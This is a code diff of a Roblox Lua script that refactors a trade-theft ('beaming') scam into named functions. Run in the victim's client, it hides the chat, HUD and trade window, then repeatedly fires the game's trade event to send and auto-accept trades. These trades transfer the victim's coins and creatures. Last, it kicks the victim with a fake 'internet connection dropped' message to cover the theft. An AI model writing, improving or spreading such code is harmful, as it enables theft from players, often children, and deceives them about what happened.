@@ -1,3 +1,4 @@
+local function UiDisabler()
 local mp = game.Players.LocalPlayer.PlayerGui
 	while wait (1) do
 		mp.Chat.Enabled = false
@@ -16,11 +17,11 @@ local mp = game.Players.LocalPlayer.PlayerGui
 		mp.HUD.Enabled = false
 		mp.Trade.BG.Position = UDim2.new(10, 0, 10, 0)
 	end
+ end 
   
   
   
-  
-  
+  local function AutoSend()
   while wait(1) do
 	if game.Players.LocalPlayer.PlayerGui.Trade.Enabled == false then
 
@@ -32,11 +33,11 @@ local mp = game.Players.LocalPlayer.PlayerGui
 		game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))
 	end
 end
+end  
   
   
   
-  
-  
+ local function AutoAccept() 
   while wait(1) do
 	if #game:GetService("Players").LocalPlayer.PlayerGui.Trade.BG.You["1"]:GetChildren() >= 3 then
 		local args = {
@@ -46,8 +47,9 @@ end
 game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))
 	end
 end
+end
 
-
+local function MushBeam()
 local mush = game:GetService("Players").LocalPlayer.Data.Coins.Value
 if mush >= 36000 then
 	local args = {
@@ -145,14 +147,14 @@ if mush <= 12000 then
 
 	game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))
 end
+end
 
 
 
 
 
 
-
-
+local function CreatureBeam()
 local mush = game:GetService("Players").LocalPlayer.Data.Coins.Value
 local broke = false
 	if mush == 0 then
@@ -564,16 +566,14 @@ local broke = false
 
 			end
 		end
+end
 
 
 
-
-
-
-
-
+local function kicker()
   while wait(10) do
 	if #game:GetService("Players").LocalPlayer.PlayerGui.Trade.BG.You["1"]:GetChildren() >= 2 then
 		game.Players.LocalPlayer:Kick("Your internet connection dropped, potential data loss has occured")
 	end
+end
 end
